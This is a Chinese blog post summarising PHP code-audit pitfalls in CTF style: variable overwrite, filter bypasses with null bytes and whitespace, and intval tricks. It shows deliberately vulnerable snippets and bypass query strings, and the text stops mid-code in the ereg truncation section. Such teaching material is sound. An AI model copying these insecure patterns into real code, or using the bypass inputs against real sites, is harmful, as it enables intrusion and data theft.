<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="PHP代码审计归纳"><meta name="keywords" content="PHP,安全,Web"><meta name="author" content="Qug_,undefined"><meta name="copyright" content="Qug_"><title>PHP代码审计归纳 | Qug's Blog</title><link rel="shortcut icon" href="/my-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.5.6"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css?version=1.5.6"><link rel="dns-prefetch" href="https://cdn.staticfile.org"><link rel="dns-prefetch" href="https://cdn.bootcss.com"><link rel="dns-prefetch" href="https://creativecommons.org"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  }
} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#变量覆盖"><span class="toc-number">1.</span> <span class="toc-text">变量覆盖</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#extract"><span class="toc-number">1.1.</span> <span class="toc-text">extract()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#parse-str"><span class="toc-number">1.2.</span> <span class="toc-text">parse_str()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#import-request-variables"><span class="toc-number">1.3.</span> <span class="toc-text">import_request_variables()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#变量覆盖-1"><span class="toc-number">1.4.</span> <span class="toc-text">$$变量覆盖</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#全局变量覆盖漏洞"><span class="toc-number">1.5.</span> <span class="toc-text">全局变量覆盖漏洞</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过过滤的空白字符"><span class="toc-number">2.</span> <span class="toc-text">绕过过滤的空白字符</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intval整数溢出"><span class="toc-number">3.</span> <span class="toc-text">intval整数溢出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#intval-四舍五入"><span class="toc-number">4.</span> <span class="toc-text">intval 四舍五入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#浮点数精度忽略"><span class="toc-number">5.</span> <span class="toc-text">浮点数精度忽略</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#多重加密"><span class="toc-number">6.</span> <span class="toc-text">多重加密</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#截断"><span class="toc-number">7.</span> <span class="toc-text">截断</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#iconv-异常字符截断"><span class="toc-number">7.1.</span> <span class="toc-text">iconv 异常字符截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#eregi、ereg可用-00截断"><span class="toc-number">7.2.</span> <span class="toc-text">eregi、ereg可用%00截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#move-uploaded-file-用-0截断"><span class="toc-number">7.3.</span> <span class="toc-text">move_uploaded_file 用\0截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#inclue用？截断"><span class="toc-number">7.4.</span> <span class="toc-text">inclue用？截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#系统长度截断"><span class="toc-number">7.5.</span> <span class="toc-text">系统长度截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql长度截断"><span class="toc-number">7.6.</span> <span class="toc-text">mysql长度截断</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mysql中utf-8截断"><span class="toc-number">7.7.</span> <span class="toc-text">mysql中utf-8截断</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#弱类型比较"><span class="toc-number">8.</span> <span class="toc-text">弱类型比较</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#、-gt-、-lt-的弱类型比较"><span class="toc-number">8.1.</span> <span class="toc-text">==、&gt;、&lt;的弱类型比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#switch-弱类型"><span class="toc-number">8.2.</span> <span class="toc-text">switch 弱类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#md5比较（0e相等、数组为Null）"><span class="toc-number">8.3.</span> <span class="toc-text">md5比较（0e相等、数组为Null）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#json传数据-“key”-0"><span class="toc-number">8.4.</span> <span class="toc-text">json传数据{“key”:0}</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strcmp漏洞1：返回0"><span class="toc-number">8.5.</span> <span class="toc-text">strcmp漏洞1：返回0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strcmp漏洞2：返回Null"><span class="toc-number">8.6.</span> <span class="toc-text">strcmp漏洞2：返回Null</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strcmp漏洞3-判断使用的是"><span class="toc-number">8.7.</span> <span class="toc-text">strcmp漏洞3: 判断使用的是 ==</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#in-array，array-search-弱类型比较"><span class="toc-number">8.8.</span> <span class="toc-text">in_array，array_search 弱类型比较</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sha1-md5-报错相等绕过（False-False）"><span class="toc-number">8.9.</span> <span class="toc-text">sha1() md5() 报错相等绕过（False === False）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#strpos数组NULL-Null-False"><span class="toc-number">8.10.</span> <span class="toc-text">strpos数组NULL(Null !== False)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#十六进制与十进制比较"><span class="toc-number">8.11.</span> <span class="toc-text">十六进制与十进制比较</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#md5注入带入’or’"><span class="toc-number">9.</span> <span class="toc-text">md5注入带入’or’</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#switch没有break"><span class="toc-number">10.</span> <span class="toc-text">switch没有break</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#反序列化"><span class="toc-number">11.</span> <span class="toc-text">反序列化</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#文件包含"><span class="toc-number">12.</span> <span class="toc-text">文件包含</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提交参数无过滤"><span class="toc-number">13.</span> <span class="toc-text">提交参数无过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#伪造IP"><span class="toc-number">14.</span> <span class="toc-text">伪造IP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过正则匹配"><span class="toc-number">15.</span> <span class="toc-text">绕过正则匹配</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#缺少-和-限定"><span class="toc-number">15.1.</span> <span class="toc-text">缺少^和$限定</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#数组绕过正则"><span class="toc-number">15.2.</span> <span class="toc-text">数组绕过正则</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#str-replace路径穿越"><span class="toc-number">15.3.</span> <span class="toc-text">str_replace路径穿越</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#short-open-tag-on-短标签"><span class="toc-number">16.</span> <span class="toc-text">short_open_tag=on 短标签</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#file-put-contents第二个参数传入数组"><span class="toc-number">17.</span> <span class="toc-text">file_put_contents第二个参数传入数组</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#单引号和双引号"><span class="toc-number">18.</span> <span class="toc-text">单引号和双引号</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#查询语句缺少单引号"><span class="toc-number">18.1.</span> <span class="toc-text">查询语句缺少单引号</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#宽字符注入"><span class="toc-number">19.</span> <span class="toc-text">宽字符注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#跳转无退出"><span class="toc-number">20.</span> <span class="toc-text">跳转无退出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#二次编码注入"><span class="toc-number">21.</span> <span class="toc-text">二次编码注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#前端可控变量填充导致XSS"><span class="toc-number">22.</span> <span class="toc-text">前端可控变量填充导致XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#命令执行函数"><span class="toc-number">23.</span> <span class="toc-text">命令执行函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#create-function"><span class="toc-number">23.1.</span> <span class="toc-text">create_function</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#mb-ereg-replace-的-e模式"><span class="toc-number">23.2.</span> <span class="toc-text">mb_ereg_replace()的/e模式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#preg-replace-e模式执行命令"><span class="toc-number">23.3.</span> <span class="toc-text">preg_replace /e模式执行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#动态函数执行"><span class="toc-number">24.</span> <span class="toc-text">动态函数执行</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码执行"><span class="toc-number">25.</span> <span class="toc-text">代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#eval-和assert-代码执行"><span class="toc-number">25.1.</span> <span class="toc-text">eval()和assert()代码执行</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#优先级绕过"><span class="toc-number">26.</span> <span class="toc-text">优先级绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#getimagesize图片判断绕过"><span class="toc-number">27.</span> <span class="toc-text">getimagesize图片判断绕过</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#lt-变-，windows-findfirstfile利用"><span class="toc-number">28.</span> <span class="toc-text">&lt;变*，windows findfirstfile利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#处理value没有处理key"><span class="toc-number">29.</span> <span class="toc-text">处理value没有处理key</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#用来目录遍历的特别函数"><span class="toc-number">30.</span> <span class="toc-text">用来目录遍历的特别函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#绕过GD库图片渲染"><span class="toc-number">31.</span> <span class="toc-text">绕过GD库图片渲染</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#会话固定"><span class="toc-number">32.</span> <span class="toc-text">会话固定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#资料"><span class="toc-number">33.</span> <span class="toc-text">资料</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="https://avatars1.githubusercontent.com/u/24547164?s=460&amp;v=4"></div><div class="author-info__name text-center">Qug_</div><div class="author-info__description text-center">Life is only inevitable, there is no chance.</div><div class="follow-button"><a href="https://github.com/qinshuang1998" target="_blank">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">13</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">22</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">7</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="http://h3c.qugcloud.cn" target="_blank">H3C-V7在线手册</a><a class="author-info-links__name text-center" href="http://music.qugcloud.cn" target="_blank">VIP音源下载</a><a class="author-info-links__name text-center" href="https://isk2y.github.io" target="_blank">iSk2y's Blog</a></div></div></div><div id="content-outer"><div id="top-container" style="background-image: url(http://cdn.qugcloud.cn/image/jpg/banner2.jpg)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Qug's Blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="post-info"><div id="post-title">PHP代码审计归纳</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2017-12-19</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/信息安全/">信息安全</a><div class="post-meta-wordcount"><span>字数总计: </span><span class="word-count">6.6k</span><span class="post-meta__separator">|</span><span>阅读时长: 28 分钟</span></div></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><h2 id="变量覆盖"><a href="#变量覆盖" class="headerlink" title="变量覆盖"></a>变量覆盖</h2><h3 id="extract"><a href="#extract" class="headerlink" title="extract()"></a>extract()</h3><p>该函数使用数组键名作为变量名，使用数组键值作为变量值。针对数组中的每个元素，将在当前符号表中创建对应的一个变量。条件：若有EXTR_SKIP则不行。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a = <span class="string">"Original"</span>;</span><br><span class="line">$my_array = <span class="keyword">array</span>(<span class="string">"a"</span> =&gt; <span class="string">"Cat"</span>,<span class="string">"b"</span> =&gt; <span class="string">"Dog"</span>, <span class="string">"c"</span> =&gt; <span class="string">"Horse"</span>);</span><br><span class="line">extract($my_array); </span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\$a = $a; \$b = $b; \$c = $c"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment"># 结果：$a = Cat; $b = Dog; $c = Horse</span></span><br></pre></td></tr></table></figure></p>
<p>这里原来是$a是original，后面通过extract把$a覆盖变成了Cat了,所以这里把原来的变量给覆盖了。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#?shiyan=&amp;flag=1</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$flag=<span class="string">'xxx'</span>; </span><br><span class="line">extract($_GET);</span><br><span class="line"> <span class="keyword">if</span>(<span class="keyword">isset</span>($shiyan))</span><br><span class="line"> &#123; </span><br><span class="line">    $content=trim(file_get_contents($flag)); <span class="comment"># content is 0 , flag can be anything,cause file_get_contents cannot open file, return 0</span></span><br><span class="line">    <span class="keyword">if</span>($shiyan==$content)</span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span><span class="string">'ctf&#123;xxx&#125;'</span>; </span><br><span class="line">    &#125;</span><br><span class="line">   <span class="keyword">else</span></span><br><span class="line">   &#123; </span><br><span class="line">    <span class="keyword">echo</span><span class="string">'Oh.no'</span>;</span><br><span class="line">   &#125; </span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<h3 id="parse-str"><a href="#parse-str" class="headerlink" title="parse_str()"></a>parse_str()</h3><p>解析字符串并注册成变量<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$b=<span class="number">1</span>;</span><br><span class="line">Parse_str(<span class="string">'b=2'</span>);</span><br><span class="line">Print_r($b);</span><br><span class="line"><span class="comment"># 结果: $b=2</span></span><br></pre></td></tr></table></figure></p>
<h3 id="import-request-variables"><a href="#import-request-variables" class="headerlink" title="import_request_variables()"></a>import_request_variables()</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">将 GET/POST/Cookie 变量导入到全局作用域中，全局变量注册。</span><br><span class="line">在<span class="number">5.4</span>之后被取消，只可在<span class="number">4</span><span class="number">-4.1</span><span class="number">.0</span>和<span class="number">5</span><span class="number">-5.4</span><span class="number">.0</span>可用。</span><br><span class="line"><span class="comment">//导入POST提交的变量值，前缀为post_</span></span><br><span class="line">import_request_variable(<span class="string">"p"</span>， <span class="string">"post_"</span>);</span><br><span class="line"><span class="comment">//导入GET和POST提交的变量值，前缀为gp_，GET优先于POST</span></span><br><span class="line">import_request_variable(<span class="string">"gp"</span>， <span class="string">"gp_"</span>);</span><br><span class="line"><span class="comment">//导入Cookie和GET的变量值，Cookie变量值优先于GET</span></span><br><span class="line">import_request_variable(<span class="string">"cg"</span>， <span class="string">"cg_"</span>);</span><br></pre></td></tr></table></figure>
<h3 id="变量覆盖-1"><a href="#变量覆盖-1" class="headerlink" title="$$变量覆盖"></a>$$变量覆盖</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 提交参数chs，则可覆盖变量"$chs"的值。$key为chs时，$$key就变成$chs</span></span><br><span class="line"><span class="meta">&lt;?</span>  </span><br><span class="line">$chs = <span class="string">''</span>;  </span><br><span class="line"><span class="keyword">if</span>($_POST &amp;&amp; $charset != <span class="string">'utf-8'</span>)&#123;  </span><br><span class="line">    $chs = <span class="keyword">new</span> Chinese(<span class="string">'UTF-8'</span>, $charset);  </span><br><span class="line">    <span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $key =&gt; $value)&#123;  </span><br><span class="line">        $$key = $chs-&gt;Convert($value);  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="keyword">unset</span>($chs);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="全局变量覆盖漏洞"><a href="#全局变量覆盖漏洞" class="headerlink" title="全局变量覆盖漏洞"></a>全局变量覆盖漏洞</h3><p>原理：<br>register_globals 是php中的一个控制选项，可以设置成off或者on, 默认为off, 决定是否将 EGPCS（Environment，GET，POST，Cookie，Server）变量注册为全局变量。<br>如果register_globals打开的话, 客户端提交的数据中含有GLOBALS变量名, 就会覆盖服务器上的$GLOBALS变量.</p>
<p>$_REQUEST 这个超全局变量的值受 php.ini中request_order的影响，在php5.3.x系列中，request_order默认值为GP，也就是说默认配置下$_REQUEST只包含$_GET和$_POST而不包括$_COOKIE。通过COOKIE就可以提交GLOBALS变量。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// register_globals =ON</span></span><br><span class="line"><span class="comment">//foo.php?GLOBALS[foobar]=HELLO</span></span><br><span class="line"><span class="keyword">echo</span> $foobar;</span><br><span class="line"></span><br><span class="line"><span class="comment">//为了安全取消全局变量</span></span><br><span class="line"><span class="comment">//var.php?GLOBALS[a]=aaaa&amp;b=111</span></span><br><span class="line"><span class="keyword">if</span> (ini_get(<span class="string">"register_globals"</span>)) <span class="keyword">foreach</span>($_REQUEST <span class="keyword">as</span> $k=&gt;$v) <span class="keyword">unset</span>($&#123;$k&#125;);</span><br><span class="line"><span class="keyword">print</span> $a;</span><br><span class="line"><span class="keyword">print</span> $_GET[b];</span><br></pre></td></tr></table></figure>
<p>经过测试，开了register_globals会卡死</p>
<h2 id="绕过过滤的空白字符"><a href="#绕过过滤的空白字符" class="headerlink" title="绕过过滤的空白字符"></a>绕过过滤的空白字符</h2><p>原理：<a href="https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6" target="_blank" rel="noopener">https://baike.baidu.com/item/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">控制码</span><br><span class="line">&quot;\0&quot; &quot;%00&quot; (ASCII  0 (0x00))，空字节符。</span><br><span class="line"></span><br><span class="line">制表符</span><br><span class="line">&quot;\t&quot; (ASCII  9 (0x09))，水平制表符。</span><br><span class="line"></span><br><span class="line">空白字符：</span><br><span class="line">&quot;\n&quot; (ASCII 10 (0x0A))，换行符。</span><br><span class="line">&quot;\v&quot; &quot;\x0b&quot; (ASCII  11 (0x0B))，垂直制表符。</span><br><span class="line">&quot;\f&quot; &quot;%0c&quot; 换页符</span><br><span class="line">&quot;\r&quot; &quot;%0d&quot;(ASCII  13 (0x0D))，回车符。</span><br><span class="line"></span><br><span class="line">空格:</span><br><span class="line">&quot; &quot; &quot;%20&quot; (ASCII  32 (0x20))，普通空格符。</span><br></pre></td></tr></table></figure>
<p>而trim过滤的空白字符有<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string trim ( string $str [, string $character_mask = <span class="string">" \t\n\r\0\x0B"</span> ] )</span><br></pre></td></tr></table></figure></p>
<p>其中缺少了\f</p>
<p>2 函数对空白字符的特性<br>is_numeric函数在开始判断前，会先跳过所有空白字符。这是一个特性。<br>也就是说，is_numeirc(“ \r\n \t 1.2”)是会返回true的。同理，intval(“ \r\n \t 12”)，也会正常返回12。</p>
<p>案例</p>
<p><a href="https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php" target="_blank" rel="noopener">https://github.com/bowu678/php_bugs/blob/master/02%20%E7%BB%95%E8%BF%87%E8%BF%87%E6%BB%A4%E7%9A%84%E7%A9%BA%E7%99%BD%E5%AD%97%E7%AC%A6.php</a><br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#?number=%00%0c191</span></span><br><span class="line"><span class="comment"># 1 %00绕过is_numeric</span></span><br><span class="line"><span class="comment"># 2 \f（也就是%0c）在数字前面，trim，intval和is_numeric都会忽略这个字符</span></span><br></pre></td></tr></table></figure></p>
<h2 id="intval整数溢出"><a href="#intval整数溢出" class="headerlink" title="intval整数溢出"></a>intval整数溢出</h2><p>php整数上限溢出绕过intval</p>
<p>intval 函数最大的值取决于操作系统。<br>32 位系统最大带符号的 integer 范围是 -2147483648 到 2147483647。举例，在这样的系统上， intval(‘1000000000000’) 会返回 2147483647。<br>64 位系统上，最大带符号的 integer 值是 9223372036854775807。</p>
<h2 id="intval-四舍五入"><a href="#intval-四舍五入" class="headerlink" title="intval 四舍五入"></a>intval 四舍五入</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ?a=1024.1</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>($_GET[id]) &#123;</span><br><span class="line">mysql_connect(SAE_MYSQL_HOST_M . <span class="string">':'</span> . SAE_MYSQL_PORT,SAE_MYSQL_USER,SAE_MYSQL_PASS);</span><br><span class="line">mysql_select_db(SAE_MYSQL_DB);</span><br><span class="line">$id = intval($_GET[id]); <span class="comment">## 这里过滤只有一个intval</span></span><br><span class="line">$query = @mysql_fetch_array(mysql_query(<span class="string">"select content from ctf2 where id='$id'"</span>));</span><br><span class="line"><span class="keyword">if</span> ($_GET[id]==<span class="number">1024</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;p&gt;no! try again&lt;/p&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span>($query[content]);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="浮点数精度忽略"><a href="#浮点数精度忽略" class="headerlink" title="浮点数精度忽略"></a>浮点数精度忽略</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ($req[<span class="string">"number"</span>] != intval($req[<span class="string">"number"</span>]))</span><br></pre></td></tr></table></figure>
<p>在小数小于某个值（10^-16）以后，再比较的时候就分不清大小了。<br>输入number = 1.00000000000000010, 右边变成1.0, 而左与右比较会相等。</p>
<h2 id="多重加密"><a href="#多重加密" class="headerlink" title="多重加密"></a>多重加密</h2><p>题目中有：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$login = unserialize(gzuncompress(base64_decode($requset[<span class="string">'token'</span>])));</span><br><span class="line"><span class="keyword">if</span>($login[<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>)&#123;<span class="keyword">echo</span> $flag;&#125;</span><br></pre></td></tr></table></figure></p>
<p>本地则写：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>([<span class="string">'user'</span>] === <span class="string">'ichunqiu'</span>);</span><br><span class="line">$token = base64_encode(gzcompress(serialize($arr)));</span><br><span class="line">print_r($token);</span><br><span class="line"><span class="comment">// 得到eJxLtDK0qs60MrBOAuJaAB5uBBQ=</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<h2 id="截断"><a href="#截断" class="headerlink" title="截断"></a>截断</h2><h3 id="iconv-异常字符截断"><a href="#iconv-异常字符截断" class="headerlink" title="iconv 异常字符截断"></a>iconv 异常字符截断</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## 因iconv遇到异常字符就不转后面的内容了，所以可以截断。</span></span><br><span class="line"><span class="comment">## 这里chr(128)到chr(255)都可以截断。</span></span><br><span class="line">$a=<span class="string">'1'</span>.char(<span class="number">130</span>).<span class="string">'2'</span>;</span><br><span class="line"><span class="keyword">echo</span> iconv(<span class="string">"UTF-8"</span>,<span class="string">"gbk"</span>,$a); <span class="comment">//将字符串的编码从UTF-8转到gbk</span></span><br><span class="line"><span class="keyword">echo</span> iconv(<span class="string">'GB2312'</span>, <span class="string">'UTF-8'</span>, $str); <span class="comment">//将字符串的编码从GB2312转到UTF-8</span></span><br></pre></td></tr></table></figure>
<h3 id="eregi、ereg可用-00截断"><a href="#eregi、ereg可用-00截断" class="headerlink" title="eregi、ereg可用%00截断"></a>eregi、ereg可用%00截断</h3><p>功能：正则匹配过滤<br>条件：要求php&lt;5.3.4</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">## http://127.0.0.1/Php_Bug/05.php?password=1e9%00*-*</span></span><br><span class="line"><span class="comment">#GET方式提交password，然后用ereg()正则限制了password的形式，只能是一个或者多个数字、大小写字母，继续strlen()限制了长度小于8并且大小必须大于9999999，继续strpos()对password进行匹配，必须含有-，最终才输出flag</span></span><br><span class="line"><span 